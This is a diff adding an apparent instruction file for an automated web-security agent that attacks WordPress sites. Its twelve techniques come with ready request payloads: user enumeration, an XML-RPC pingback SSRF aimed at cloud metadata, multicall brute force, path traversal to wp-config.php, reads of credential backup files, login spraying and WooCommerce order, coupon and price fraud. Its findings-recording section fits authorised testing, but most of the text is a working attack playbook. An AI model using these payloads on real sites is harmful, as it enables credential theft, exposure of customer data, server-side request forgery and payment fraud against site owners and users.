@@ -1,0 +1,261 @@
+SCOPE: WordPress installations — enumerate users, plugins, themes, and configuration weaknesses; exploit unauthenticated REST API and XML-RPC endpoints; fingerprint and exploit known-vulnerable plugin and theme versions.
+
+## TARGETS
+
+- REST API root: `/wp-json/`, `/wp-json/wp/v2/`
+- Admin panel: `/wp-admin/`, `/wp-login.php`
+- XML-RPC: `/xmlrpc.php`
+- Admin Ajax: `/wp-admin/admin-ajax.php`
+- Uploads directory: `/wp-content/uploads/`
+- Plugin directory: `/wp-content/plugins/<plugin-slug>/`
+- Theme directory: `/wp-content/themes/<theme-slug>/`
+- `wp-config.php` backup files: `wp-config.php.bak`, `wp-config.php~`, `wp-config.old`, `.wp-config.php.swp`
+- Environment files: `/.env`, `/.env.local`, `/.env.production` (common in WP with Bedrock/Trellis setups)
+- Debug log: `/wp-content/debug.log`
+
+## TECHNIQUES
+
+1. **User enumeration via REST API**
+   The `/wp-json/wp/v2/users` endpoint lists registered WordPress users including their username (used to log in), display name, avatar, and any public metadata. This endpoint is unauthenticated by default in most installations.
+
+   ```
+   GET /wp-json/wp/v2/users
+   200 OK → [{"id":1,"name":"admin","slug":"admin","link":"https://example.com/author/admin/","avatar_urls":{...}},...]
+
+   # List all users with pagination:
+   GET /wp-json/wp/v2/users?per_page=100&page=1
+   GET /wp-json/wp/v2/users?per_page=100&page=2
+
+   # Fetch specific user by ID (enumerate IDs 1-100):
+   GET /wp-json/wp/v2/users/1
+   GET /wp-json/wp/v2/users/2
+   ```
+
+   Collect all `slug` values (login usernames) for password spray and credential stuffing.
+
+2. **Author archive username reveal**
+   The `?author=N` query parameter redirects to `/author/<username>/` archives, revealing usernames even when REST API user enumeration is disabled.
+
+   ```
+   GET /?author=1   → 301 redirect to /author/admin/   (username: admin)
+   GET /?author=2   → 301 redirect to /author/editor/  (username: editor)
+   GET /?author=3   → 404 (no user with ID 3)
+
+   # Enumerate IDs until 404 pattern:
+   for i in $(seq 1 50); do curl -sI "https://example.com/?author=$i" | grep Location; done
+   ```
+
+3. **XML-RPC pingback SSRF and amplification**
+   XML-RPC is enabled by default at `/xmlrpc.php` and supports the `pingback.ping` method, which causes the WordPress server to make an outbound HTTP request to an attacker-specified URL. This is a server-side request forgery primitive.
+
+   ```
+   POST /xmlrpc.php
+   Content-Type: text/xml
+   <?xml version="1.0"?>
+   <methodCall>
+     <methodName>pingback.ping</methodName>
+     <params>
+       <param><value><string>http://169.254.169.254/latest/meta-data/</string></value></param>
+       <param><value><string>https://example.com/any-post/</string></value></param>
+     </params>
+   </methodCall>
+
+   # Server makes outbound request to first param URL
+   # Use OOB HTTP callback (Collaborator/interactsh) to confirm SSRF
+   ```
+
+   Also check whether XML-RPC is enabled at all:
+   ```
+   POST /xmlrpc.php
+   <?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params/></methodCall>
+   200 OK → list of all available XML-RPC methods (brute force login with system.multicall)
+   ```
+
+   `system.multicall` allows bundling hundreds of `wp.getUsersBlogs` (credential check) calls in a single HTTP request — brute force at scale.
+
+4. **Unauthenticated admin-ajax.php actions**
+   WordPress plugins and themes register AJAX handlers via `wp_ajax_<action>` (authenticated) and `wp_ajax_nopriv_<action>` (unauthenticated). Unregistered `nopriv` actions that incorrectly use `nopriv` hooks expose admin functionality without auth.
+
+   ```
+   POST /wp-admin/admin-ajax.php
+   Content-Type: application/x-www-form-urlencoded
+   action=<discovered-action-name>
+
+   # Common unauth actions to try:
+   action=elementor_ajax
+   action=et_ajax_menu_search
+   action=wpcf7_before_send_mail
+   action=yith_wishlist_get_products_from_wishlist
+   action=rank_math_search_keyword
+   action=wpml_language_switcher
+   action=mailpoet_get_form
+   ```
+
+   Enumerate action names from plugin JavaScript files at `/wp-content/plugins/<plugin>/assets/js/*.js` — look for `action:` properties in AJAX calls.
+
+5. **REST API namespace enumeration**
+   WordPress plugins register custom REST routes under namespaces. Discover all registered routes:
+
+   ```
+   GET /wp-json/
+   200 OK → {"namespaces":["wp/v2","oembed/1.0","wc/v1","wc/v2","wc/v3","wc/store","jetpack/v4","elementor/v1"],...}
+
+   # Probe each namespace root:
+   GET /wp-json/wc/v3/   → WooCommerce API routes (orders, customers, products)
+   GET /wp-json/elementor/v1/   → Elementor routes
+   GET /wp-json/wp/v2/settings   → Site settings (auth required but try without)
+   ```
+
+   For WooCommerce:
+   ```
+   GET /wp-json/wc/v3/orders      → all orders (if consumer key auth missing)
+   GET /wp-json/wc/v3/customers   → all customer PII
+   GET /wp-json/wc/v3/products    → product catalog including draft/private
+   ```
+
+6. **?rest_route= query-string variant**
+   Some WordPress installations have rewrite rules disabled or broken, but the REST API is still accessible via the `?rest_route=` fallback query string. This bypasses WAF rules and nginx/Apache rewrite-level blocks that target `wp-json`.
+
+   ```
+   GET /?rest_route=/wp/v2/users
+   GET /?rest_route=/wp/v2/posts&status=draft
+   GET /?rest_route=/wp/v2/settings   (may require auth, but try without)
+   ```
+
+7. **Common plugin CVE fingerprinting**
+   Identify installed plugins from `/wp-content/plugins/<slug>/readme.txt` (contains version number) and match against known CVEs. Always probe these high-value targets:
+
+   ```
+   # Elementor (visual builder):
+   GET /wp-content/plugins/elementor/readme.txt   → "Stable tag: X.Y.Z"
+   CVEs: Stored XSS (multiple), IDOR on template data, unauth settings update
+
+   # Elementor Pro:
+   GET /wp-content/plugins/elementor-pro/readme.txt
+   CVEs: Unauthenticated options update (CVE-2023-48777), privilege escalation
+
+   # WPBakery / Visual Composer:
+   GET /wp-content/plugins/js_composer/readme.txt
+   CVEs: Stored XSS, privilege escalation
+
+   # Yoast SEO:
+   GET /wp-content/plugins/wordpress-seo/readme.txt
+   CVEs: Reflected XSS in admin pages, race condition on bulk actions
+
+   # RankMath SEO:
+   GET /wp-content/plugins/seo-by-rank-math/readme.txt
+   CVEs: Unauth REST API access to update meta (CVE-2020-11514), redirect open
+
+   # Contact Form 7:
+   GET /wp-content/plugins/contact-form-7/readme.txt
+   CVEs: File upload bypass, unrestricted file types (CVE-2020-35489)
+
+   # WooCommerce:
+   GET /wp-content/plugins/woocommerce/readme.txt
+   CVEs: SQLi (CVE-2023-23671 and predecessors), payment bypass, coupon abuse
+
+   # LearnPress:
+   GET /wp-content/plugins/learnpress/readme.txt
+   CVEs: SQLi in REST API (CVE-2022-47615), IDOR on quiz results, auth bypass
+
+   # Ultimate Member:
+   GET /wp-content/plugins/ultimate-member/readme.txt
+   CVEs: Privilege escalation via registration form (CVE-2023-3460 — critical, unpatched widely)
+   ```
+
+8. **Theme editor LFI / path traversal**
+   The built-in theme editor (`/wp-admin/theme-editor.php`) and plugin editor are gated by admin auth, but plugins that add similar functionality may have path traversal in their `file` or `path` parameters.
+
+   ```
+   # Native theme editor (requires admin):
+   GET /wp-admin/theme-editor.php?file=../../../wp-config.php&theme=twentytwenty
+
+   # Plugin-based file managers (as low-privilege subscriber):
+   POST /wp-admin/admin-ajax.php
+   action=wp_file_manager&action=fs_folder_view&path=../../../../
+   ```
+
+   Also probe plugins: WP File Manager (CVE-2020-25213 — unauthenticated file upload), Advanced Custom Fields, and any plugin that lists `file`, `filepath`, `path`, `template` as AJAX parameters.
+
+9. **wp-config.php and backup file exposure**
+   `wp-config.php` is blocked by default Apache/Nginx rules, but backup files in common locations are often not blocked.
+
+   ```
+   GET /wp-config.php.bak
+   GET /wp-config.php~
+   GET /wp-config.php.orig
+   GET /wp-config.old
+   GET /wp-config.php.save
+   GET /.wp-config.php.swp
+   GET /wp-config.php.1
+   GET /backup/wp-config.php
+   GET /wp-config.txt
+
+   200 OK → contains DB_NAME, DB_USER, DB_PASSWORD, AUTH_KEY, SECRET_KEY, table prefix
+   ```
+
+   Also check `/wp-content/debug.log` for PHP errors that include file paths, database queries, and potentially credentials:
+   ```
+   GET /wp-content/debug.log
+   ```
+
+10. **WordPress login brute force and credential spray**
+    `/wp-login.php` accepts POST with `log` (username) and `pwd` (password). With usernames from REST API or author enumeration, run a targeted spray.
+
+    ```
+    POST /wp-login.php
+    Content-Type: application/x-www-form-urlencoded
+    log=admin&pwd=admin&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1
+
+    # Enumerate common passwords: admin, password, 123456, domain-name, site-name
+    # Watch for: "ERROR: The password you entered" (valid user) vs. "Unknown username" (invalid user)
+    # → differentiates valid usernames from invalid ones (even with enumeration disabled)
+    ```
+
+    Also check `wp-json/wp/v2/users/me` with Application Password auth (Basic `username:app-password`) — if application passwords are enabled and common passwords work.
+
+11. **Exposed wp-cron.php and post status manipulation**
+    WordPress cron (`/wp-cron.php`) can be triggered externally. Some plugins schedule sensitive operations (email sends, cleanup jobs, privilege updates) that could be triggered prematurely or repeatedly.
+
+    ```
+    GET /wp-cron.php?doing_wp_cron=1
+    ```
+
+    Also probe drafts and future-scheduled posts via REST API:
+    ```
+    GET /wp-json/wp/v2/posts?status=draft,future,private,pending
+    # May return posts not intended to be public if auth check is missing
+    ```
+
+12. **WooCommerce coupon, payment, and order manipulation**
+    WooCommerce REST API and checkout endpoints have historically had logic flaws allowing coupon stacking, negative price exploitation, and order status manipulation.
+
+    ```
+    # Apply unlimited coupons by sending multiple discount codes:
+    POST /wp-json/wc/v3/cart/add-item or via checkout form:
+    coupon_code[]=DISC10&coupon_code[]=DISC20&coupon_code[]=DISC30
+
+    # Order status manipulation (if webhook or REST lacks auth):
+    PUT /wp-json/wc/v3/orders/<id>
+    {"status":"completed"}   (without paying)
+
+    # Price manipulation via direct API call (if consumer key obtained):
+    POST /wp-json/wc/v3/products
+    {"name":"My Product","regular_price":"0"}
+
+    # Negative quantity to get refund without return:
+    POST /checkout (form) with quantity=-1
+    ```
+
+## WHAT TO RECORD
+
+When calling `mantis_record_finding`, populate:
+
+- `title`: e.g. "WordPress REST API exposes all usernames unauthenticated", "XML-RPC pingback SSRF → internal metadata access", "WPBakery 6.4.1 — stored XSS in widget title"
+- `severity`: `critical` (unauth RCE, database credentials exposed, admin account takeover), `high` (all-user PII export, SSRF to cloud metadata, plugin unauth code execution), `medium` (user enumeration enabling targeted brute force, XMLrpc multicall available, wp-config backup exposed), `low` (plugin/theme version fingerprint, debug log accessible)
+- `url`: the endpoint probed
+- `method`: HTTP method
+- `request_body`: payload for POST requests (admin-ajax action, XML-RPC envelope, REST API call)
+- `response_status` and `response_body_excerpt`: evidence showing the vulnerability
+- `evidence_notes`: plugin name and version if relevant; CVE number if a known CVE was confirmed; explain what attacker can do with the finding (e.g., "with DB credentials from wp-config.bak, attacker can extract all user password hashes and PII")
+- `cwe`: CWE-200 (Information Exposure); CWE-918 (SSRF via pingback); CWE-284 (Improper Access Control); CWE-89 (SQLi in plugin); CWE-639 (IDOR)
